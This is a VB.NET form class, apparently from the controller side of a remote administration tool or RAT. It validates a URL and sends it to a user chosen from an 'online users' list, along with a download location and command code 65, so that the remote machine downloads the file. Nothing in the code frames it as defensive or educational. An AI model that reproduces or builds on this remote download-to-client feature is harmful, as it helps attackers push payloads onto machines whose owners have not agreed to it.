Imports System.Text.RegularExpressions

Public Class Downloadmanager


    ' Regex pattern to make sure input is a valid URL
    Private Function ValidatewebsiteAddress(ByVal address As String) As Boolean
        If Not Regex.IsMatch(address, _
       "^((ht|f)tp(s?)\:\/\/|~/|/)?([\w]+:\w+@)?([a-zA-Z]{1}([\w\-]+\.)+([\w]{2,5}))(:[\d]{1,5})?((/?\w+/)+|/?)(\w+\.[\w]{3,4})?((\?\w+=\w+)?(&\w+=\w+)*)?") Then
            Return False
        Else
            Return True
        End If
    End Function

    Private Sub Downloadmanager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Set default value in the combobox
        ComboBoxDownloadLocation.SelectedIndex = 0
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If ValidatewebsiteAddress(TextBoxDownloadLink.Text) = False Then
            MsgBox("Please enter a valid download link.", MsgBoxStyle.Exclamation, "Invalid link")
        Else
            Settings.AddLog("Pending", Settings.State.Pending, "Downloading file from url...")
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(TextBoxDownloadLink.Text & "|||" & ComboBoxDownloadLocation.SelectedIndex.ToString)
                Main.WriteCommand(Main.SelectedUserID & "|65")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
            End Try
        End If
    End Sub
End Class